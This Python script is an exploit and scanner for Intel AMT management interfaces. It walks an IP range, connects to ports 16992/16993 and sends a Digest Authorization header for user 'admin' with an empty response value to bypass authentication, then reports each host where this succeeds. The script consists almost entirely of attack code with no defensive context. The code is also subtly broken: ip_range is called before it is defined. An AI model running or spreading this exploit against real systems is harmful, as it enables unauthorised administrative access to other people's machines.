#!/usr/bin/env python
#
# Intel A-hole script
#

import requests
import sys

# IP range to check
iplist = ip_range('192.168.0.0','192.168.0.10')

def ip_range(start_ip,end_ip):
  start = list(map(int,start_ip.split('.')))
  end = list(map(int,end_ip.split('.')))
  iprange=[]

  while start!=list(map(int,end_ip.split('.'))):
    for i in range(len(start)-1,-1,-1):
      if start[i]<255:
        start[i]+=1
        break
      else:
        start[i]=0
    iprange.append('.'.join(map(str,start)))
  return iprange

def CheckAMT (ip, protocol):
  if protocol == 'http':
    url = 'http://'+ip+':16992/index.htm'
  elif protocol == 'https':
    url = 'https://'+ip+':16993/index.htm'
  else:
    url = 'http://'+ip+':16992/index.htm'


  try:
    req = requests.get(url, timeout=1)
  except:
    #print "ERROR: Could not open URL ", sys.exc_info()
    print("%s Failed for IP %s" % (protocol, ip))
    return
  auth = req.headers['WWW-Authenticate']

  words = auth.split('"')
  headers = 'Digest username= "admin", realm="'+words[1]+'", nonce="'+words[3]+'", uri="index.htm", response="", qop="auth", nc="00000001", cnonce="8858482c60513ab5" '
  poc = requests.get(url, headers={'Authorization': headers})

  if poc.status_code == 200:
    print('Success for IP ' + ip)
  else:
    print('Failed for IP ' + ip)

#####################################

for ipaddr in iplist:
  CheckAMT(ipaddr, 'http') 
  # Enable for AMT TLS port
  #CheckAMT(ipaddr, 'https')
